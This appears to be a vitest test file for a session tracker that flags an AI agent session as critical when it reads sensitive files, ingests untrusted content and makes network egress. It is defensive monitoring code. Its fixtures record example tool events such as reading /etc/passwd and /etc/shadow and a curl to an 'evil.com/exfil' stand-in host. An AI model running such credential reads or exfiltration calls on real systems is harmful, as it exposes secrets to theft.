// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { describe, it, expect, beforeEach } from "vitest";
import { SessionStore, Capability } from "./session-tracker.js";

// ── Test helpers ─────────────────────────────────────────────

let store: SessionStore;

beforeEach(() => {
  store = new SessionStore();
});

/** Assert a value is non-null and return it with the narrowed type. */
function assertDefined<T>(value: T | null | undefined): T {
  expect(value).toBeDefined();
  expect(value).not.toBeNull();
  return value as T;
}

// ── record + getCapabilities ─────────────────────────────────

describe("record and getCapabilities", () => {
  it("records a capability and retrieves it", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    const caps = assertDefined(store.getCapabilities("s1"));
    expect(caps[Capability.ReadSensitive]).toBe(true);
  });

  it("tracks multiple capabilities per session", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/shadow");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    const caps = assertDefined(store.getCapabilities("s1"));
    expect(caps[Capability.ReadSensitive]).toBe(true);
    expect(caps[Capability.HasEgress]).toBe(true);
    expect(caps[Capability.IngestedUntrusted]).toBeUndefined();
  });

  it("returns null for unknown session", () => {
    const caps = store.getCapabilities("nonexistent");
    expect(caps).toBeNull();
  });

  it("ignores empty session ID", () => {
    store.record("", Capability.ReadSensitive, "cat", "/etc/passwd");
    const caps = store.getCapabilities("");
    expect(caps).toBeNull();
  });

  it("returns a copy of capabilities, not a reference", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    const caps1 = store.getCapabilities("s1");
    const caps2 = store.getCapabilities("s1");
    expect(caps1).toEqual(caps2);
    expect(caps1).not.toBe(caps2);
  });
});

// ── hasTrifecta ──────────────────────────────────────────────

describe("hasTrifecta", () => {
  it("returns false with zero capabilities", () => {
    expect(store.hasTrifecta("empty")).toBe(false);
  });

  it("returns false with one capability", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    expect(store.hasTrifecta("s1")).toBe(false);
  });

  it("returns false with two capabilities", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    expect(store.hasTrifecta("s1")).toBe(false);
  });

  it("returns true with all three capabilities", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(store.hasTrifecta("s1")).toBe(true);
  });

  it("returns false for unknown session", () => {
    expect(store.hasTrifecta("unknown")).toBe(false);
  });
});

// ── Risk classification ──────────────────────────────────────

describe("risk classification", () => {
  it("classifies elevated with one capability", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    const sessions = store.listSessions();
    const s1 = assertDefined(sessions.find((s) => s.sessionId === "s1"));
    expect(s1.riskLevel).toBe("elevated");
  });

  it("classifies elevated with two capabilities", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.HasEgress, "curl", "https://x.com");
    const sessions = store.listSessions();
    const s1 = assertDefined(sessions.find((s) => s.sessionId === "s1"));
    expect(s1.riskLevel).toBe("elevated");
  });

  it("classifies critical with trifecta", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    const sessions = store.listSessions();
    const s1 = assertDefined(sessions.find((s) => s.sessionId === "s1"));
    expect(s1.riskLevel).toBe("critical");
    expect(s1.trifecta).toBe(true);
  });
});

// ── Event cap at 100 ─────────────────────────────────────────

describe("event cap", () => {
  it("stores exactly 100 events and drops the 101st", () => {
    for (let i = 0; i < 101; i++) {
      store.record("s1", Capability.ReadSensitive, "cat", `/file-${String(i)}`);
    }
    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.events).toHaveLength(100);
    expect(exposure.events[0].detail).toBe("/file-0");
    expect(exposure.events[99].detail).toBe("/file-99");
    const details = exposure.events.map((e) => e.detail);
    expect(details).not.toContain("/file-100");
  });

  it("still records capability even when event log is full", () => {
    for (let i = 0; i < 100; i++) {
      store.record("s1", Capability.ReadSensitive, "cat", `/file-${String(i)}`);
    }
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    const caps = assertDefined(store.getCapabilities("s1"));
    expect(caps[Capability.HasEgress]).toBe(true);
    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.events).toHaveLength(100);
  });
});

// ── Session isolation ────────────────────────────────────────

describe("session isolation", () => {
  it("tracks sessions independently", () => {
    store.record("a", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("b", Capability.HasEgress, "curl", "https://evil.com");

    const capsA = assertDefined(store.getCapabilities("a"));
    const capsB = assertDefined(store.getCapabilities("b"));

    expect(capsA[Capability.ReadSensitive]).toBe(true);
    expect(capsA[Capability.HasEgress]).toBeUndefined();

    expect(capsB[Capability.HasEgress]).toBe(true);
    expect(capsB[Capability.ReadSensitive]).toBeUndefined();
  });

  it("does not leak trifecta across sessions", () => {
    store.record("a", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("b", Capability.IngestedUntrusted, "fetch", "https://x.com");
    store.record("c", Capability.HasEgress, "curl", "https://evil.com");

    expect(store.hasTrifecta("a")).toBe(false);
    expect(store.hasTrifecta("b")).toBe(false);
    expect(store.hasTrifecta("c")).toBe(false);
  });
});

// ── getExposure ──────────────────────────────────────────────

describe("getExposure", () => {
  it("returns null for unknown session", () => {
    const exposure = store.getExposure("nonexistent");
    expect(exposure).toBeNull();
  });

  it("returns null for empty session ID", () => {
    const exposure = store.getExposure("");
    expect(exposure).toBeNull();
  });

  it("categorizes events into exposure fields", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://untrusted.com/payload");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com/exfil");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.sensitiveFilesAccessed).toEqual(["/etc/passwd"]);
    expect(exposure.externalUrlsContacted).toEqual(["https://untrusted.com/payload"]);
    expect(exposure.egressAttempts).toEqual(["curl https://evil.com/exfil"]);
  });

  it("deduplicates sensitive files by detail", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.ReadSensitive, "head", "/etc/passwd");
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/shadow");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.sensitiveFilesAccessed).toEqual(["/etc/passwd", "/etc/shadow"]);
  });

  it("deduplicates external URLs by detail", () => {
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com/a");
    store.record("s1", Capability.IngestedUntrusted, "wget", "https://x.com/a");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://y.com/b");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.externalUrlsContacted).toEqual(["https://x.com/a", "https://y.com/b"]);
  });

  it("does NOT deduplicate egress attempts", () => {
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    store.record("s1", Capability.HasEgress, "wget", "https://evil.com");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.egressAttempts).toEqual([
      "curl https://evil.com",
      "curl https://evil.com",
      "wget https://evil.com",
    ]);
  });

  it("formats egress with tool only when detail is empty", () => {
    store.record("s1", Capability.HasEgress, "curl", "");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.egressAttempts).toEqual(["curl"]);
  });

  it("skips empty details for sensitive files", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "");
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.sensitiveFilesAccessed).toEqual(["/etc/passwd"]);
  });

  it("skips empty details for external URLs", () => {
    store.record("s1", Capability.IngestedUntrusted, "fetch", "");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.externalUrlsContacted).toEqual(["https://x.com"]);
  });

  it("includes correct risk level and trifecta flag", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");

    const exposure = assertDefined(store.getExposure("s1"));
    expect(exposure.trifecta).toBe(true);
    expect(exposure.riskLevel).toBe("critical");
  });
});

// ── listSessions ─────────────────────────────────────────────

describe("listSessions", () => {
  it("returns empty array with no sessions", () => {
    const sessions = store.listSessions();
    expect(sessions).toEqual([]);
  });

  it("returns all sessions with summaries", () => {
    store.record("a", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("b", Capability.HasEgress, "curl", "https://evil.com");
    store.record("b", Capability.IngestedUntrusted, "fetch", "https://x.com");

    const sessions = store.listSessions();
    expect(sessions).toHaveLength(2);

    const a = assertDefined(sessions.find((s) => s.sessionId === "a"));
    const b = assertDefined(sessions.find((s) => s.sessionId === "b"));

    expect(a.eventCount).toBe(1);
    expect(a.trifecta).toBe(false);
    expect(a.riskLevel).toBe("elevated");

    expect(b.eventCount).toBe(2);
    expect(b.trifecta).toBe(false);
    expect(b.riskLevel).toBe("elevated");
  });

  it("reflects trifecta in session summary", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");

    const sessions = store.listSessions();
    const s1 = assertDefined(sessions.find((s) => s.sessionId === "s1"));
    expect(s1.trifecta).toBe(true);
    expect(s1.riskLevel).toBe("critical");
  });
});

// ── Error-path tests ─────────────────────────────────────────

describe("error paths", () => {
  it("handles empty string capability details gracefully", () => {
    store.record("s1", Capability.ReadSensitive, "", "");
    const caps = assertDefined(store.getCapabilities("s1"));
    expect(caps[Capability.ReadSensitive]).toBe(true);
  });

  it("handles rapid session creation", () => {
    for (let i = 0; i < 1000; i++) {
      store.record(`session-${String(i)}`, Capability.ReadSensitive, "cat", `/file-${String(i)}`);
    }
    const sessions = store.listSessions();
    expect(sessions).toHaveLength(1000);
  });
});

// ── onTrifecta callback ───────────────────────────────────────

describe("onTrifecta callback", () => {
  it("fires when all three capabilities are first recorded", () => {
    const fired: string[] = [];
    const tracked = new SessionStore((id) => fired.push(id));
    tracked.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    tracked.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    expect(fired).toHaveLength(0);
    tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(fired).toEqual(["s1"]);
  });

  it("fires only once per session even on repeated records", () => {
    const fired: string[] = [];
    const tracked = new SessionStore((id) => fired.push(id));
    tracked.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    tracked.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com/again");
    expect(fired).toHaveLength(1);
  });

  it("does not fire for partial capabilities", () => {
    const fired: string[] = [];
    const tracked = new SessionStore((id) => fired.push(id));
    tracked.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(fired).toHaveLength(0);
  });

  it("fires independently for different sessions", () => {
    const fired: string[] = [];
    const tracked = new SessionStore((id) => fired.push(id));
    for (const id of ["a", "b"]) {
      tracked.record(id, Capability.ReadSensitive, "cat", "/etc/passwd");
      tracked.record(id, Capability.IngestedUntrusted, "fetch", "https://x.com");
      tracked.record(id, Capability.HasEgress, "curl", "https://evil.com");
    }
    expect(fired.sort()).toEqual(["a", "b"]);
  });
});

// ── clear ─────────────────────────────────────────────────────

describe("clear", () => {
  it("removes all sessions", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s2", Capability.HasEgress, "curl", "https://evil.com");
    store.clear();
    expect(store.listSessions()).toHaveLength(0);
  });

  it("hasTrifecta returns false after clear", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(store.hasTrifecta("s1")).toBe(true);
    store.clear();
    expect(store.hasTrifecta("s1")).toBe(false);
  });

  it("allows new sessions to be created after clear", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.clear();
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    const caps = assertDefined(store.getCapabilities("s1"));
    expect(caps[Capability.ReadSensitive]).toBeUndefined();
    expect(caps[Capability.HasEgress]).toBe(true);
  });

  it("getExposure returns null after clear", () => {
    store.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    store.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(store.getExposure("s1")).not.toBeNull();
    store.clear();
    expect(store.getExposure("s1")).toBeNull();
  });
});

// ── onTrifecta + clear interaction ────────────────────────────

describe("onTrifecta after clear", () => {
  it("fires again when trifecta is re-achieved after clear", () => {
    const fired: string[] = [];
    const tracked = new SessionStore((id) => fired.push(id));
    tracked.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    tracked.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(fired).toEqual(["s1"]);
    tracked.clear();
    tracked.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    tracked.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    expect(fired).toEqual(["s1", "s1"]);
  });

  it("swallows callback errors without disrupting record", () => {
    const tracked = new SessionStore(() => {
      throw new Error("boom");
    });
    tracked.record("s1", Capability.ReadSensitive, "cat", "/etc/passwd");
    tracked.record("s1", Capability.IngestedUntrusted, "fetch", "https://x.com");
    expect(() => {
      tracked.record("s1", Capability.HasEgress, "curl", "https://evil.com");
    }).not.toThrow();
    expect(tracked.hasTrifecta("s1")).toBe(true);
  });
});
